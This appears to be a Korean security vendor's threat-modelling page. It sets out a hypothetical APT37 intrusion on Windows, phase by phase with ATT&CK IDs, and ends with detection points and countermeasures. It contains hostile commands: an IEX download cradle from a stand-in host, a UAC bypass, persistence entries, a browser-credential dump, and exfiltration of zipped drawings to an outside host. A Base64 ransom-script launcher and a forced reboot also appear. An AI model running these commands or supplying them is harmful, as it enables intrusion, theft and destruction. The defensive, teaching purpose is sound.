# APT37(ScarCruft) — 가상의 Windows 침투 시나리오

## 가정 환경

* **대상**: 한국 소재 제조업 본사 네트워크 (Windows 10/11 클라이언트)
* **모니터링**: 기본 이벤트 로그 + Sysmon v13 구성
* **보안 설정**: UAC 기본값 유지 (EnableLUA = 1)
* **목표**: R\&D 설계 도면 탈취 후 내부 중요 PC 파괴

---

## 1️⃣ 초기 침투 (Initial Access / Execution)

| 순서  | TID                                   | 행위                          | 사용 명령·기술                |
| --- | ------------------------------------- | --------------------------- | ----------------------- |
| 1-1 | T1566.001 – Spear Phishing Attachment | 팀장에게 악성 한글(HWP) 문서 첨부 메일 발송 | 악성 HWP 파일 전송            |
| 1-2 | T1204.002 – User Execution            | 사용자가 문서 열람, 매크로 실행          | HWP 매크로 내 PowerShell 호출 |
| 1-3 | T1105 – Ingress Tool Transfer         | 최종 백도어(Dolphin) 다운로드 및 실행   | PowerShell IEX 다운로드     |

```powershell
powershell -ep bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://cdn.evilsite.kr/dropper.ps1')"
```

---

## 2️⃣ 권한 상승·지속화 (Privilege Escalation / Persistence)

| 순서  | TID                                     | 행위                         | 사용 명령·기술                                       |
| --- | --------------------------------------- | -------------------------- | ---------------------------------------------- |
| 2-1 | T1548.002 – Bypass User Account Control | UAC 우회 (Akagi + fodhelper) | `.\Akagi64.exe 30 C:\Windows\System32\cmd.exe` |
| 2-2 | T1547.001 – Registry Run Keys           | Run 키 등록으로 사용자 로그인 시 자동 실행 |                                                |

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "%APPDATA%\update.exe"
```

| 2-3 | T1053.005 – Scheduled Task | SYSTEM 권한 확보 위한 예약 작업 생성 |

```cmd
schtasks /Create /RU SYSTEM /SC ONSTART /TN "SvcInit" /TR "%APPDATA%\update.exe"
```

---

## 3️⃣ 시스템·사용자 조사 (Discovery)

| 순서  | TID                                  | 행위                       | 사용 명령·기술      |
| --- | ------------------------------------ | ------------------------ | ------------- |
| 3-1 | T1082 – System Information Discovery | OS, 패치, 도메인 정보 수집        | `systeminfo`  |
| 3-2 | T1033 – System Owner/User Discovery  | 사용자 정보 및 권한 확인           | `whoami /all` |
| 3-3 | T1057 – Process Discovery            | 백신 및 보안 프로세스 확인          | `tasklist /v` |
| 3-4 | T1120 – Peripheral Device Discovery  | 외장 USB 탐지 (설계도 백업 여부 확인) |               |

```powershell
powershell -c "Get-PnpDevice -Class USB"
```

---

## 4️⃣ 자격 증명·데이터 수집 (Credential Access / Collection)

| 순서  | TID                                       | 행위              | 사용 명령·기술 |
| --- | ----------------------------------------- | --------------- | -------- |
| 4-1 | T1555.003 – Credentials from Web Browsers | Chrome 저장 암호 덤프 |          |

```powershell
powershell -ep bypass -c "(Get-ItemProperty -Path 'HKCU:\Software\Google\Chrome\...') > '%TEMP%\chrome_creds.txt'"
```

| 4-2 | T1005 – Data from Local System | CAD/PDF 도면 검색 및 ZIP 압축 |

```powershell
$dir="C:\Projects"; $zip="$env:TEMP\designs.zip"; Compress-Archive -Path $dir\*.pdf,$dir\*.dwg -DestinationPath $zip
```

| 4-3 | T1123 – Audio Capture | 회의 녹음 15초 |

```cmd
"%ProgramFiles%\AudioRecorder.exe" -out "%TEMP%\meeting.wav" -d 15
```

---

## 5️⃣ C2 통신·데이터 유출 (Command & Control / Exfiltration)

| 순서  | TID                               | 행위               | 사용 명령·기술 |
| --- | --------------------------------- | ---------------- | -------- |
| 5-1 | T1071.001 – Web Protocols (HTTPS) | CDN 기반 HTTPS 터널링 |          |

```cmd
bitsadmin /transfer myDownload /download /priority normal "https://cdn.dropzone.net/beacon" "%TEMP%\b.dat"
```

| 5-2 | T1105 – Ingress Tool Transfer | 설계도 압축본 업로드 |

```powershell
Invoke-RestMethod "https://cdn.dropzone.net/upload" -InFile "$env:TEMP\designs.zip"
```

---

## 6️⃣ 파괴 행위 (Impact)

| 순서  | TID                            | 행위                 | 사용 명령·기술 |
| --- | ------------------------------ | ------------------ | -------- |
| 6-1 | T1529 – System Shutdown/Reboot | 강제 재부팅 → 암호화 전환 시도 |          |

```cmd
shutdown /r /t 1 /f
```

| 6-2 | T1027 – Obfuscated Files or Information | 랜섬노트 실행 Base64 인젝션 |

```powershell
powershell -c "IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('base64encodedransomscript==')))"
```

---

## 📌 탐지·수색 포인트 요약

| 단계     | Sysmon/Event ID           | 탐지 키워드                         |
| ------ | ------------------------- | ------------------------------ |
| 권한 상승  | Sysmon 1 (ProcessCreate)  | `Akagi64.exe`, `fodhelper.exe` |
| 시스템 조사 | Sysmon 1 / 4688           | `systeminfo`, `wmic`, `whoami` |
| 자격 탈취  | Event ID 4656             | `Chrome Login Data` 접근         |
| 외부 전송  | Sysmon 3 (NetworkConnect) | 외부 443 → SNI: `cdn-*`          |
| 시스템 파괴 | Event ID 1074             | `Shutdown Type: restart`       |

---

## 🔒 PLURA-XDR 대응 방법 요약 및 참고 자료

* 의심스러운 HWP/LNK 첨부 파일 차단 및 정밀 검사
* PowerShell IEX 및 Base64 인코딩 탐지 정책 강화
* Sysmon + PLURA-XDR 기반의 로그 상관 분석
* PLURA-EDR 통한 Akagi 실행·UAC 우회 패턴 탐지
* LNK 및 예약 작업 생성 탐지 정책 설정 필수

👉 [자세히](plura_waf_xdr_detection.md)

---
